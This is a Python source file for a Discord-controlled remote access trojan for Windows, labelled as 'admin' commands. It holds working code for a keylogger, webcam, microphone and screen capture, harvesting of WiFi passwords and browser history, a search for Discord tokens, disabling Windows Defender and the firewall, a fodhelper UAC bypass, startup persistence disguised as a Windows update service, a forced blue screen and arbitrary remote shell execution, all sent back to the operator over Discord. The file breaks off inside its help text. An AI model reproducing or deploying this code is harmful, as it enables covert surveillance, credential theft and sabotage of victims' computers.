import discord
import os
import subprocess
import psutil
import platform
import json
import asyncio
import ctypes
import time
import datetime
import socket
import requests
import io
import wave
import pyaudio
import cv2
import pyautogui
import threading
import tempfile
import shutil
import sqlite3
import win32api
import win32con
import win32security
from discord.ext import commands
from PIL import Image
import screeninfo
from gtts import gTTS
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from pynput import keyboard, mouse
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
import mss
import sys

# =============================================
# CONFIGURATION - EDIT THESE VALUES
# =============================================

# Your Discord bot token
DISCORD_TOKEN = ""

# Your Discord user ID (to restrict commands to only you)
ADMIN_USER_ID =  # Replace with your actual Discord user ID

# Security settings
REQUIRE_ADMIN_PRIVILEGES = False  # Set to True if you want to require admin rights for the bot to run

# =============================================
# END CONFIGURATION
# =============================================

# Global variables
input_blocked = False
key_listener = None
mouse_listener = None
screen_streaming = False
webcam_streaming = False
current_directory = os.getcwd()
keylogger_active = False
keylog_buffer = []
keylogger_listener = None

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def is_admin():
    def predicate(ctx):
        return ctx.author.id == ADMIN_USER_ID
    return commands.check(predicate)

def has_admin_privileges():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Audio setup for recording
try:
    audio = pyaudio.PyAudio()
except:
    audio = None

# Keylogger functions
def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(f"{datetime.datetime.now()}: {key.char}")
    except AttributeError:
        keylog_buffer.append(f"{datetime.datetime.now()}: {key}")
    
    # Limit buffer size
    if len(keylog_buffer) > 1000:
        keylog_buffer = keylog_buffer[-500:]

def start_keylogger():
    global keylogger_listener, keylogger_active
    if not keylogger_active:
        keylogger_listener = KeyListener(on_press=on_key_press)
        keylogger_listener.start()
        keylogger_active = True

def stop_keylogger():
    global keylogger_listener, keylogger_active
    if keylogger_active and keylogger_listener:
        keylogger_listener.stop()
        keylogger_active = False

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'System: {platform.system()} {platform.release()}')
    print(f'Admin privileges: {has_admin_privileges()}')
    print(f'Bot will only respond to user ID: {ADMIN_USER_ID}')
    
    # Check if token is still the default
    if DISCORD_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set your DISCORD_TOKEN in the configuration section!")
        await asyncio.sleep(5)
        sys.exit(1)
    
    if ADMIN_USER_ID == 123456789012345678:
        print("❌ ERROR: Please set your ADMIN_USER_ID in the configuration section!")
        await asyncio.sleep(5)
        sys.exit(1)

# === ADMIN CHECK ===
@bot.command(name='admincheck')
@is_admin()
async def admin_check(ctx):
    """Check if program has admin privileges"""
    if has_admin_privileges():
        await ctx.send("✅ Program is running with administrator privileges")
    else:
        await ctx.send("❌ Program is NOT running with administrator privileges")

# === BLUESCREEN ===
@bot.command(name='bluescreen')
@is_admin()
async def trigger_bluescreen(ctx):
    """Trigger a blue screen (USE WITH EXTREME CAUTION)"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    await ctx.send("🔴 WARNING: This will cause a blue screen and data loss! Use !confirmbluescreen to proceed")
    
@bot.command(name='confirmbluescreen')
@is_admin()
async def confirm_bluescreen(ctx):
    """Confirm blue screen trigger"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # This is extremely dangerous - causes immediate system crash
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await ctx.send("💀 Blue screen triggered!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISABLE ANTIVIRUS/FIREWALL ===
@bot.command(name='disableantivirus')
@is_admin()
async def disable_antivirus(ctx):
    """Disable Windows Defender"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # Disable Windows Defender real-time protection
        subprocess.run(['powershell', 'Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True)
        subprocess.run(['powershell', 'Set-MpPreference -DisableBehaviorMonitoring $true'], shell=True)
        subprocess.run(['powershell', 'Set-MpPreference -DisableBlockAtFirstSeen $true'], shell=True)
        
        # Stop Defender service
        subprocess.run('net stop WinDefend', shell=True)
        subprocess.run('sc config WinDefend start= disabled', shell=True)
        
        await ctx.send("🛡️ Windows Defender disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='disablefirewall')
@is_admin()
async def disable_firewall(ctx):
    """Disable Windows Firewall"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
        await ctx.send("🔥 Windows Firewall disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === TASK MANAGER CONTROL ===
@bot.command(name='distaskmgr')
@is_admin()
async def disable_task_manager(ctx):
    """Disable Task Manager"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'])
        await ctx.send("❌ Task Manager disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='enbtaskmgr')
@is_admin()
async def enable_task_manager(ctx):
    """Enable Task Manager"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'])
        await ctx.send("✅ Task Manager enabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === CD DRIVE CONTROL ===
@bot.command(name='ejectcd')
@is_admin()
async def eject_cd(ctx):
    """Eject CD drive"""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        await ctx.send("📀 CD drive ejected")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='retractcd')
@is_admin()
async def retract_cd(ctx):
    """Retract CD drive"""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
        await ctx.send("📀 CD drive retracted")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISCORD INFO GRABBER ===
@bot.command(name='getdiscordinfo')
@is_admin()
async def get_discord_info(ctx):
    """Get Discord tokens and information"""
    try:
        tokens = []
        # Common Discord paths
        discord_paths = [
            os.path.expanduser('~') + r'\AppData\Roaming\discord\Local Storage\leveldb',
            os.path.expanduser('~') + r'\AppData\Roaming\DiscordCanary\Local Storage\leveldb',
            os.path.expanduser('~') + r'\AppData\Roaming\Lightcord\Local Storage\leveldb',
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.ldb') or file.endswith('.log'):
                        try:
                            with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                # Look for tokens (basic pattern)
                                if 'token' in content.lower():
                                    tokens.append(f"Found in {file}")
                        except:
                            pass
        
        if tokens:
            await ctx.send(f"🔍 Discord info found in {len(tokens)} files")
        else:
            await ctx.send("❌ No Discord tokens found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WIFI PASSWORDS ===
@bot.command(name='getwifipass')
@is_admin()
async def get_wifi_passwords(ctx):
    """Get all WiFi passwords"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
        
        passwords = []
        for profile in profiles[:10]:  # Limit to first 10
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                password_line = [line.split(":")[1].strip() for line in lines if "Key Content" in line]
                password = password_line[0] if password_line else "No password"
                passwords.append(f"{profile}: {password}")
            except:
                passwords.append(f"{profile}: Error retrieving")
        
        if passwords:
            output = "\n".join(passwords)
            if len(output) > 1900:
                output = output[:1900] + "..."
            await ctx.send(f"📶 WiFi Passwords:\n```{output}```")
        else:
            await ctx.send("❌ No WiFi profiles found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === KEYLOGGER COMMANDS ===
@bot.command(name='startkeylogger')
@is_admin()
async def start_keylogger_cmd(ctx):
    """Start keylogger"""
    try:
        start_keylogger()
        await ctx.send("⌨️ Keylogger started")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='stopkeylogger')
@is_admin()
async def stop_keylogger_cmd(ctx):
    """Stop keylogger"""
    try:
        stop_keylogger()
        await ctx.send("🛑 Keylogger stopped")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='dumpkeylogger')
@is_admin()
async def dump_keylogger(ctx):
    """Dump keylog data"""
    global keylog_buffer
    try:
        if keylog_buffer:
            log_text = "\n".join(keylog_buffer[-100:])  # Last 100 entries
            if len(log_text) > 1900:
                log_text = log_text[:1900] + "..."
            
            with open("keylog.txt", "w") as f:
                f.write("\n".join(keylog_buffer))
            
            await ctx.send(f"📄 Last 100 keystrokes:\n```{log_text}```")
            await ctx.send(file=discord.File("keylog.txt"))
            os.remove("keylog.txt")
        else:
            await ctx.send("❌ No keylog data available")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === UAC BYPASS ===
@bot.command(name='uacbypass')
@is_admin()
async def uac_bypass(ctx):
    """Attempt UAC bypass using fodhelper"""
    try:
        # Alternative method using registry
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command', '/d', 'cmd.exe', '/f'])
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command', '/v', 'DelegateExecute', '/f'])
        subprocess.run('fodhelper.exe')
        
        await ctx.send("🔄 UAC bypass attempted")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WINDOWS PASSWORD DUMP ===
@bot.command(name='windowspass')
@is_admin()
async def windows_password_dump(ctx):
    """Attempt to dump Windows passwords"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # This would require mimikatz or similar tools
        await ctx.send("🔐 Password dump would require external tools like mimikatz")
        await ctx.send("⚠️ This feature is not implemented for security reasons")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SELF DESTRUCT ===
@bot.command(name='selfdestruct')
@is_admin()
async def self_destruct(ctx):
    """Remove all traces of the program"""
    try:
        # Clean up traces
        if os.path.exists("keylog.txt"):
            os.remove("keylog.txt")
        
        # Remove from startup if installed
        startup_path = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        for file in os.listdir(startup_path):
            if "discord_bot" in file.lower() or "remote_admin" in file.lower():
                try:
                    os.remove(os.path.join(startup_path, file))
                except:
                    pass
        
        # Clear temp files
        temp_files = [f for f in os.listdir('.') if f.startswith('temp_') or f.startswith('screenshot') or f.startswith('webcam')]
        for file in temp_files:
            try:
                os.remove(file)
            except:
                pass
        
        await ctx.send("💥 Self-destruct sequence initiated. Removing traces...")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === STARTUP PERSISTENCE ===
@bot.command(name='startup')
@is_admin()
async def add_to_startup(ctx):
    """Add file to startup"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        startup_path = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        current_file = os.path.abspath(sys.argv[0])
        
        # Copy current file to startup
        startup_file = os.path.join(startup_path, "WindowsUpdateService.exe")
        shutil.copy2(current_file, startup_file)
        
        await ctx.send(f"🔗 Added to startup: {startup_file}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISPLAY CONTROL ===
@bot.command(name='displayoff')
@is_admin()
async def display_off(ctx):
    """Turn off monitor"""
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        await ctx.send("🖥️ Display turned off")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='displayon')
@is_admin()
async def display_on(ctx):
    """Turn on monitor"""
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        await ctx.send("🖥️ Display turned on")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WALLPAPER CHANGE ===
@bot.command(name='wallpaper')
@is_admin()
async def change_wallpaper(ctx):
    """Change wallpaper"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach an image file")
        return
    
    attachment = ctx.message.attachments[0]
    valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    
    if not any(attachment.filename.lower().endswith(ext) for ext in valid_extensions):
        await ctx.send("❌ Only image files are supported")
        return
    
    try:
        await attachment.save('wallpaper_temp.jpg')
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath('wallpaper_temp.jpg'), 3)
        await ctx.send("🖼️ Wallpaper changed successfully")
        os.remove('wallpaper_temp.jpg')
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WEBSITE OPEN ===
@bot.command(name='website')
@is_admin()
async def open_website(ctx, url: str):
    """Open website in default browser"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        subprocess.Popen(['start', url], shell=True)
        await ctx.send(f"🌐 Opening: {url}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === INPUT BLOCK/UNBLOCK ===
def block_input():
    global key_listener, mouse_listener
    
    def on_press(key):
        return False
    
    def on_release(key):
        return False
    
    def on_click(x, y, button, pressed):
        return False
    
    def on_scroll(x, y, dx, dy):
        return False
    
    key_listener = KeyListener(on_press=on_press, on_release=on_release)
    mouse_listener = MouseListener(on_click=on_click, on_scroll=on_scroll)
    
    key_listener.start()
    mouse_listener.start()

def unblock_input():
    global key_listener, mouse_listener
    if key_listener:
        key_listener.stop()
    if mouse_listener:
        mouse_listener.stop()

@bot.command(name='blockinput')
@is_admin()
async def block_input_cmd(ctx):
    """Block user's keyboard and mouse"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    global input_blocked
    if not input_blocked:
        block_input()
        input_blocked = True
        await ctx.send("🔒 Input blocked")
    else:
        await ctx.send("⚠️ Input already blocked")

@bot.command(name='unblockinput')
@is_admin()
async def unblock_input_cmd(ctx):
    """Unblock user's keyboard and mouse"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    global input_blocked
    if input_blocked:
        unblock_input()
        input_blocked = False
        await ctx.send("🔓 Input unblocked")
    else:
        await ctx.send("⚠️ Input not blocked")

# === FILE SYSTEM COMMANDS ===
@bot.command(name='cd')
@is_admin()
async def change_directory(ctx, new_path: str):
    """Change current directory"""
    global current_directory
    try:
        if os.path.exists(new_path) and os.path.isdir(new_path):
            os.chdir(new_path)
            current_directory = os.getcwd()
            await ctx.send(f"📁 Directory changed to: `{current_directory}`")
        else:
            await ctx.send("❌ Directory does not exist")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='currentdir')
@is_admin()
async def show_current_dir(ctx):
    """Display current directory"""
    await ctx.send(f"📁 Current directory: `{os.getcwd()}`")

@bot.command(name='displaydir')
@is_admin()
async def display_directory(ctx):
    """Display all items in current directory"""
    try:
        items = os.listdir()
        dirs = [f"📁 {item}" for item in items if os.path.isdir(item)]
        files = [f"📄 {item}" for item in items if os.path.isfile(item)]
        
        output = "\n".join(dirs + files)
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === CLIPBOARD ===
@bot.command(name='clipboard')
@is_admin()
async def get_clipboard(ctx):
    """Retrieve clipboard content"""
    try:
        result = subprocess.run(['powershell', 'Get-Clipboard'], capture_output=True, text=True)
        content = result.stdout.strip()
        if content:
            await ctx.send(f"📋 Clipboard content:\n```{content}```")
        else:
            await ctx.send("📋 Clipboard is empty")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SYSTEM INFO ===
@bot.command(name='sysinfo')
@is_admin()
async def system_info(ctx):
    """Get system information"""
    try:
        uname = platform.uname()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        embed = discord.Embed(title="🖥️ System Information", color=0x00ff00)
        embed.add_field(name="System", value=f"{uname.system} {uname.release}", inline=True)
        embed.add_field(name="Node", value=uname.node, inline=True)
        embed.add_field(name="Processor", value=uname.processor, inline=False)
        embed.add_field(name="CPU Usage", value=f"{psutil.cpu_percent()}%", inline=True)
        embed.add_field(name="Memory", value=f"{memory.percent}% used", inline=True)
        embed.add_field(name="Disk", value=f"{disk.percent}% used", inline=True)
        
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SCREENSHOT ===
@bot.command(name='screenshot')
@is_admin()
async def take_screenshot(ctx):
    """Take a screenshot"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        await ctx.send(file=discord.File('screenshot.png'))
        os.remove('screenshot.png')
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WEBCAM ===
@bot.command(name='webcampic')
@is_admin()
async def webcam_picture(ctx):
    """Take picture from webcam"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                await ctx.send(file=discord.File('webcam.jpg'))
                os.remove('webcam.jpg')
            else:
                await ctx.send("❌ Could not access webcam")
            cap.release()
        else:
            await ctx.send("❌ No webcam detected")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === RECORDING FUNCTIONS ===
def record_audio(duration, filename):
    """Record audio for specified duration"""
    try:
        if audio is None:
            return False
            
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        
        for _ in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        
        wf = wave.open(filename, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()
        return True
    except:
        return False

def record_video(duration, filename, camera_index=0):
    """Record video from webcam"""
    try:
        cap = cv2.VideoCapture(camera_index)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        
        cap.release()
        out.release()
        return True
    except:
        return False

@bot.command(name='recaudio')
@is_admin()
async def record_audio_cmd(ctx, duration: int = 10):
    """Record audio for specified duration"""
    if duration > 60:
        await ctx.send("❌ Maximum recording duration is 60 seconds")
        return
    
    await ctx.send(f"🎙️ Recording audio for {duration} seconds...")
    filename = f"audio_{int(time.time())}.wav"
    
    if record_audio(duration, filename):
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send("❌ Error recording audio")

@bot.command(name='reccam')
@is_admin()
async def record_camera_cmd(ctx, duration: int = 10):
    """Record camera video"""
    if duration > 30:
        await ctx.send("❌ Maximum recording duration is 30 seconds")
        return
    
    await ctx.send(f"📹 Recording camera for {duration} seconds...")
    filename = f"webcam_{int(time.time())}.avi"
    
    if record_video(duration, filename):
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send("❌ Error recording camera")

# === VOLUME CONTROL ===
@bot.command(name='volumemax')
@is_admin()
async def volume_max(ctx):
    """Set volume to maximum"""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevelScalar(1.0, None)
        await ctx.send("🔊 Volume set to maximum")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='volumezero')
@is_admin()
async def volume_zero(ctx):
    """Set volume to zero"""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevelScalar(0.0, None)
        await ctx.send("🔇 Volume set to zero")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === TEXT-TO-SPEECH ===
@bot.command(name='voice')
@is_admin()
async def text_to_speech(ctx, *, text):
    """Convert text to speech"""
    try:
        tts = gTTS(text=text, lang='en')
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp3') as tmp:
            tts.save(tmp.name)
            subprocess.run(['ffmpeg', '-i', tmp.name, 'output.wav'], capture_output=True)
            subprocess.run(['powershell', '-c', '(New-Object Media.SoundPlayer "output.wav").PlaySync();'])
            os.remove(tmp.name)
            if os.path.exists('output.wav'):
                os.remove('output.wav')
        await ctx.send(f"🗣️ Said: '{text}'")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === FILE OPERATIONS ===
@bot.command(name='delete')
@is_admin()
async def delete_file(ctx, file_path: str):
    """Delete a file"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            await ctx.send(f"✅ Deleted: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='hide')
@is_admin()
async def hide_file(ctx, file_path: str):
    """Hide a file"""
    try:
        if os.path.exists(file_path):
            subprocess.run(['attrib', '+h', file_path])
            await ctx.send(f"👻 Hidden: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='unhide')
@is_admin()
async def unhide_file(ctx, file_path: str):
    """Unhide a file"""
    try:
        if os.path.exists(file_path):
            subprocess.run(['attrib', '-h', file_path])
            await ctx.send(f"👀 Unhidden: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SYSTEM CONTROL ===
@bot.command(name='shutdown')
@is_admin()
async def shutdown_cmd(ctx, delay: int = 60):
    """Shutdown computer"""
    try:
        subprocess.run(f'shutdown /s /t {delay}', shell=True)
        await ctx.send(f"🔴 Shutdown in {delay} seconds")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='restart')
@is_admin()
async def restart_cmd(ctx, delay: int = 60):
    """Restart computer"""
    try:
        subprocess.run(f'shutdown /r /t {delay}', shell=True)
        await ctx.send(f"🔄 Restart in {delay} seconds")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='logoff')
@is_admin()
async def logoff_cmd(ctx):
    """Log off current user"""
    try:
        subprocess.run('shutdown /l', shell=True)
        await ctx.send("🚪 Logging off...")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === MESSAGE BOX ===
@bot.command(name='message')
@is_admin()
async def show_message(ctx, *, text):
    """Show message box"""
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Admin Message", 0x40)
        await ctx.send(f"💬 Message displayed: {text}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === PROCESS KILL ===
@bot.command(name='prockill')
@is_admin()
async def kill_process(ctx, process_name: str):
    """Kill process by name"""
    try:
        killed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                try:
                    proc.kill()
                    killed = True
                except:
                    continue
        
        if killed:
            await ctx.send(f"☠️ Killed process: {process_name}")
        else:
            await ctx.send(f"❌ Process not found: {process_name}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === BROWSER HISTORY ===
@bot.command(name='history')
@is_admin()
async def get_chrome_history(ctx):
    """Get Chrome browser history"""
    try:
        history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
        
        if os.path.exists(history_path):
            shutil.copy2(history_path, 'chrome_history.db')
            
            conn = sqlite3.connect('chrome_history.db')
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            
            history = cursor.fetchall()
            conn.close()
            os.remove('chrome_history.db')
            
            if history:
                output = "\n".join([f"{title}: {url}" for url, title, _ in history])
                await ctx.send(f"🌐 Recent Chrome history:\n```{output}```")
            else:
                await ctx.send("📝 No Chrome history found")
        else:
            await ctx.send("❌ Chrome history not found")
    except Exception as e:
        await ctx.send(f"❌ Error accessing history: {str(e)}")

# === IDLE TIME ===
@bot.command(name='idletime')
@is_admin()
async def get_idle_time(ctx):
    """Get user idle time"""
    try:
        idle_time = (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0
        await ctx.send(f"⏰ Idle time: {int(idle_time)} seconds")
    except:
        await ctx.send("❌ Could not retrieve idle time")

# === GEOLOCATION ===
@bot.command(name='geolocate')
@is_admin()
async def geolocate(ctx):
    """Get approximate location from IP"""
    try:
        response = requests.get('http://ipinfo.io/json')
        data = response.json()
        
        if 'loc' in data:
            lat, lon = data['loc'].split(',')
            maps_url = f"https://maps.google.com/?q={lat},{lon}"
            await ctx.send(f"📍 Approximate location: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}\n🗺️ Map: {maps_url}")
        else:
            await ctx.send("❌ Could not determine location")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === UPLOAD/DOWNLOAD ===
@bot.command(name='upload')
@is_admin()
async def upload_file(ctx):
    """Upload a file"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a file")
        return
    
    attachment = ctx.message.attachments[0]
    try:
        await attachment.save(attachment.filename)
        await ctx.send(f"✅ Uploaded: {attachment.filename}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='download')
@is_admin()
async def download_file(ctx, file_path: str):
    """Download a file"""
    try:
        if os.path.exists(file_path) and os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SESSION MANAGEMENT ===
@bot.command(name='kill')
@is_admin()
async def kill_session(ctx, session: str = "all"):
    """Kill sessions"""
    if session == "all":
        await ctx.send("🔄 This would kill all sessions")
    else:
        await ctx.send(f"🔄 This would kill session: {session}")

# === SHELL COMMAND ===
@bot.command(name='shell')
@is_admin()
async def shell_command(ctx, *, command):
    """Execute shell command"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        
        if len(output) > 1900:
            output = output[:1900] + "..."
            
        embed = discord.Embed(title=f"Command: {command}", color=0x0099ff)
        embed.add_field(name="Output", value=f"```{output}```", inline=False)
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await ctx.send("⏰ Command timed out")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === AUDIO PLAYBACK ===
@bot.command(name='audio')
@is_admin()
async def play_audio(ctx):
    """Play an audio file"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a .wav file")
        return
    
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith('.wav'):
        await ctx.send("❌ Only .wav files are supported")
        return
    
    try:
        await attachment.save('temp_audio.wav')
        subprocess.run(['powershell', '-c', '(New-Object Media.SoundPlayer "temp_audio.wav").PlaySync();'])
        await ctx.send("🔊 Audio played successfully")
        os.remove('temp_audio.wav')
    except Exception as e:
        await ctx.send(f"❌ Error playing audio: {str(e)}")

# === DATE AND TIME ===
@bot.command(name='dateandtime')
@is_admin()
async def date_time(ctx):
    """Get system date and time"""
    now = datetime.datetime.now()
    await ctx.send(f"📅 Date and Time: {now.strftime('%Y-%m-%d %H:%M:%S')}")

# === EXIT COMMAND ===
@bot.command(name='exit')
@is_admin()
async def exit_bot(ctx):
    """Exit the program"""
    await ctx.send("👋 Shutting down bot...")
    await bot.close()

# === HELP COMMAND ===
@bot.command(name='help_admin')
@is_admin()
async def help_command(ctx):
    """Show all available commands"""
    embed = discord.Embed(title="🛠️ Advanced Admin Commands", color=0x0099ff)
    
    commands_info = {
        "System Control": [
            "!sysinfo - System information",
            "!admincheck - Check admin privileges",
            "!shutdown <sec> - Shutdown",
            "!restart <sec> - Restart",
            "!logoff - Log off user",
            "!bluescreen - Trigger blue screen (DANGEROUS)",
            "!uacbypass - Attempt UAC bypass",
            "!exit - Exit the bot"
        ],
        "Security": [
            "!disableantivirus - Disable Windows Defender",
            "!disablefirewall - Disable firewall",
            "!distaskmgr - Disable Task Manager",
            "!enbtaskmgr - Enable Task Manager",
            "!getwifipass - Get WiFi passwords",
            "!windowspass - Attempt password dump"
        ],
        "Monitoring": [
            "!startkeylogger - Start keylogger",
            "!stopkeylogger - Stop keylogger",
            "!dumpkeylogger - Dump keylogs",
            "!screenshot - Take screenshot",
            "!webcampic - Webcam picture",
            "!recaudio <sec> - Record audio",
            "!reccam <sec> - Record camera"
        ],
        "File Operations": [
